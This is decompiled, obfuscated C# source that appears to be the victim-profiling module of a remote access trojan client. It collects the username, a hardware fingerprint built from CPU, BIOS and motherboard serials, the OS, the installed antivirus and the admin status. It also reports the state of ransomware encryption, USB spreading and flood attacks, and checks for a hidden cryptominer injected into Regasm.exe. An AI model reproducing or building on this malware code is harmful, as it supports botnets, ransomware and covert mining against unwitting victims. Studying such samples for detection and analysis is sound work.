using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Client.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns2;
using ns4;

namespace ns1;

public class GClass1
{
	private static object object_0 = GClass3.string_4;

	public static object smethod_0()
	{
		try
		{
			return Operators.ConcatenateObject(Operators.ConcatenateObject(smethod_1(), (object)"_"), (object)smethod_5());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_1()
	{
		try
		{
			return Environment.UserName;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_2()
	{
		try
		{
			return ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Unkown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_3()
	{
		try
		{
			if (Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")!.Contains("64"))
			{
				return "x64";
			}
			return "x86";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "*";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_4()
	{
		try
		{
			return new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToString("dd/MM/yyy");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_5()
	{
		try
		{
			return smethod_7(string.Concat(string.Concat(smethod_6("Win32_Processor", "ProcessorId") + "-" + smethod_6("Win32_BIOS", "SerialNumber"), "-", smethod_6("Win32_BaseBoard", "SerialNumber")), "-", smethod_6("Win32_VideoController", "Name")));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_6(string string_0, string string_1)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		try
		{
			string text = "";
			ManagementObjectCollection instances = new ManagementClass(string_0).GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					if (Operators.CompareString(text, "", false) == 0)
					{
						try
						{
							text = ((ManagementBaseObject)val).get_Item(string_1).ToString();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_7(string string_0)
	{
		checked
		{
			try
			{
				byte[] array = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(string_0));
				StringBuilder stringBuilder = new StringBuilder();
				int num = array.Length - 1;
				for (int i = 10; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("x2"));
				}
				return stringBuilder.ToString().ToUpper();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static object smethod_8()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_3("Rans-Status"), (string)null, false) == 0)
			{
				Class0.smethod_4("Rans-Status", "Not encrypted");
				return "Not encrypted";
			}
			return Class0.smethod_3("Rans-Status");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_9()
	{
		if (GClass3.bool_0)
		{
			try
			{
				if (Operators.CompareString(Class0.smethod_3("USB"), (string)null, false) == 0)
				{
					Class0.smethod_4("USB", "Not ready");
					return Class0.smethod_3("USB");
				}
				return Class0.smethod_3("USB");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				object result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
		if (!GClass3.bool_0 && !GClass3.bool_1)
		{
			return "Disabled";
		}
		return "Not ready";
	}

	public static string smethod_10()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					text = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			return text.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool smethod_11()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			if (new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return true;
			}
			return false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_12()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		string result = default(string);
		try
		{
			if (Process.GetProcessesByName("Regasm").Length > 0)
			{
				try
				{
					string text = string.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe");
					ManagementObjectCollection val = new ManagementObjectSearcher(text).Get();
					ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
					try
					{
						enumerator = val.GetEnumerator();
						while (enumerator.MoveNext())
						{
							if (((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("CommandLine").ToString()!.Contains("--donate-level="))
							{
								result = "Minning...";
								return result;
							}
						}
						return result;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return result;
				}
			}
			result = smethod_14();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_13()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_3("Flood"), (string)null, false) == 0)
			{
				Class0.smethod_4("Flood", " ");
			}
			return Class0.smethod_3("Flood");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_14()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			ManagementObject val = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
			val.Get();
			if (((ManagementBaseObject)val).get_Item("Name").ToString()!.Contains("Intel"))
			{
				return ((ManagementBaseObject)val).get_Item("Name").ToString()!.Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "");
			}
			return ((ManagementBaseObject)val).get_Item("Name").ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Unknow";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_15()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			string[] directories = Directory.GetDirectories(RuntimeEnvironment.GetRuntimeDirectory().Substring(0, 34));
			foreach (string text in directories)
			{
				if (text.Contains("v4.0"))
				{
					stringBuilder.Append("v4.0");
				}
				else if (text.Contains("v2.0"))
				{
					stringBuilder.Append("v2.0 ");
				}
			}
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
